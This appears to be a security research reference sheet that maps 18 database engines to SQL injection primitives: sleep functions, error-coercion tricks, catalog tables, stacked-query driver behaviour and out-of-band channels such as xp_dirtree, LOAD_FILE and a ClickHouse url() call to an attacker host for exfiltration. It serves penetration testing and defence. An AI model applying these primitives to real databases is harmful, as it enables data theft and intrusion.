# Expanded Comparative DBMS Matrix (18 Database Engines)

**Document Identifier:** SENTINEL-RES-DBMS-EXP-02  
**Classification:** Database Internals, Dialect Grammars & Connector Analysis  

---

## 1. Comprehensive 18-Engine Dialect Matrix

| Engine | Family | Comment Style | String Concatenation | Sleep / Delay Primitive | Error / CAST Coercion Syntax | System Catalog Tables | Stacked Batch? | Out-of-Band Channel |
|:---|:---|:---|:---|:---|:---|:---|:---|:---|
| **PostgreSQL (11–17)** | Relational | `-- `, `/* */` | `'a' \|\| 'b'` | `pg_sleep(N)` | `CAST(col AS int)` / `col::int` | `information_schema.tables`, `pg_catalog.pg_tables` | Yes (Driver-dep) | `dblink`, `COPY FROM PROGRAM` |
| **MySQL (5.7–9.0)** | Relational | `-- ` (space), `#`, `/* */` | `'a' 'b'` / `CONCAT(a,b)`| `SLEEP(N)` / `BENCHMARK(M,MD5('1'))`| `EXTRACTVALUE(1, CONCAT(0x7e, col))` | `information_schema.tables` | Driver flag | `LOAD_FILE('\\\\ip\\a')` (Windows) |
| **MariaDB (10.4–11.4)** | Relational | `-- `, `#`, `/* */` | `CONCAT(a,b)` / `\|\|` | `SLEEP(N)` | `EXTRACTVALUE(1, CONCAT(0x7e, col))` | `information_schema.tables` | Driver flag | `LOAD_FILE('\\\\ip\\a')` |
| **MSSQL (2012–2024)** | Relational | `--`, `/* */` | `'a' + 'b'` | `WAITFOR DELAY '0:0:N'` | `CONVERT(int, col)` / `CAST` | `sys.tables`, `sys.columns` | **Yes (Native)**| `master..xp_dirtree '\\\\ip\\a'` |
| **Oracle (11g–23c)** | Relational | `--`, `/* */` | `'a' \|\| 'b'` | `DBMS_LOCK.SLEEP(N)` / `APEX_UTIL.PAUSE` | `TO_NUMBER(col)` / `CAST` | `all_tables`, `user_tables`, `sys.dba_tables` | Inside `BEGIN` | `UTL_HTTP.REQUEST()`, `UTL_INADDR` |
| **SQLite (3.x)** | Embedded | `--`, `/* */` | `'a' \|\| 'b'` | `randomblob(100000000)` / `zeroblob()` | `CAST(col AS integer)` (No exception) | `sqlite_master`, `sqlite_schema` | Yes (Driver-dep) | None (Embedded local engine) |
| **IBM Db2 (LUW/zOS)** | Enterprise | `--`, `/* */` | `'a' \|\| 'b'` / `CONCAT()`| Subquery / UDF | `CAST(col AS integer)` | `syscat.tables`, `sysibm.systables` | No | UDF network socket |
| **SAP HANA** | In-Memory | `--`, `/* */` | `'a' \|\| 'b'` | Subquery / Proc | `TO_INTEGER(col)` | `SYS.TABLES`, `SYS.COLUMNS` | No | `SYS.HTTP_POST()` |
| **CockroachDB** | NewSQL (PG wire)| `-- `, `/* */` | `'a' \|\| 'b'` | `pg_sleep(N)` | `CAST(col AS int)` / `col::int` | `information_schema.tables`, `crdb_internal`| Yes | None |
| **TiDB** | NewSQL (MySQL) | `-- `, `#`, `/* */` | `CONCAT(a,b)` | `SLEEP(N)` | `CAST(col AS unsigned)` | `information_schema.tables` | Driver flag | None |
| **YugabyteDB** | NewSQL (PG wire)| `-- `, `/* */` | `'a' \|\| 'b'` | `pg_sleep(N)` | `CAST(col AS int)` | `information_schema.tables`, `pg_catalog` | Yes | `dblink` |
| **DuckDB** | In-Process OLAP | `-- `, `/* */` | `'a' \|\| 'b'` | N/A (Analytical) | `CAST(col AS integer)` | `information_schema.tables`, `duckdb_tables()`| Yes | Parquet/HTTP reads |
| **Snowflake** | Cloud DWH | `-- `, `//`, `/* */` | `'a' \|\| 'b'` / `CONCAT()`| `SYSTEM$WAIT(N)` | `TO_NUMBER(col)` | `INFORMATION_SCHEMA.TABLES` | No | External stages (S3/GCS) |
| **Amazon Redshift** | Cloud OLAP | `-- `, `/* */` | `'a' \|\| 'b'` | `pg_sleep(N)` | `CAST(col AS int)` | `information_schema.tables`, `pg_table_def` | No | Spectrum external tables |
| **ClickHouse** | Columnar OLAP | `-- `, `/* */` | `concat(a, b)` | `sleep(N)` | `toInt32(col)` | `system.tables`, `system.columns` | No | `url()`, `s3()` table functions |
| **Presto / Trino** | Federated SQL | `-- `, `/* */` | `'a' \|\| 'b'` / `concat()`| Subquery delay | `CAST(col AS integer)` | `information_schema.tables` | No | Connector network callbacks |
| **Firebird** | Relational | `-- `, `/* */` | `'a' \|\| 'b'` | Subquery / UDF | `CAST(col AS integer)` | `rdb$relations`, `rdb$relation_fields` | No | External UDFs |
| **H2 / Apache Derby** | Embedded Java | `--`, `//`, `/* */` | `'a' \|\| 'b'` | `CALL sleep(N)` | `CAST(col AS int)` | `information_schema.tables` | Yes | Java class execution |

---

## 2. Deep Engine & Driver Quirks

### 2.1 Connector Multi-Statement Protocols
- **Node.js `mysql2` & Python `PyMySQL`**: By default, `multipleStatements: false` rejects stacked queries containing `;`. If a developer enables `multipleStatements: true` for database migrations, stacked injections become fully exploitable.
- **Java JDBC**: Drivers for PostgreSQL, MySQL, and Oracle reject multi-queries passed to `PreparedStatement.executeQuery()`, but permit them in `Statement.execute()`.
- **Go `database/sql` + `lib/pq`**: Disallows multi-statement parameters in prepared mode; allows multi-statement query execution in `db.Exec()`.

### 2.2 Modern Cloud & Analytical Specifics
- **ClickHouse**: Provides powerful built-in network table functions (`SELECT * FROM url('http://attacker.domain', CSV, 'c String')`), enabling high-bandwidth OAST data exfiltration without requiring elevated superuser file privileges.
- **Snowflake Cloud Data Warehouse**: Supports `SYSTEM$WAIT(seconds)` directly in procedural blocks and `INFORMATION_SCHEMA.COLUMNS` with rich JSON variant querying (`parse_json()`).
- **CockroachDB & YugabyteDB**: While implementing PostgreSQL wire protocol, internal storage engines reject procedural functions (`COPY FROM PROGRAM`, `pg_read_file`), preventing file access while preserving full integer `CAST` schema leakage.
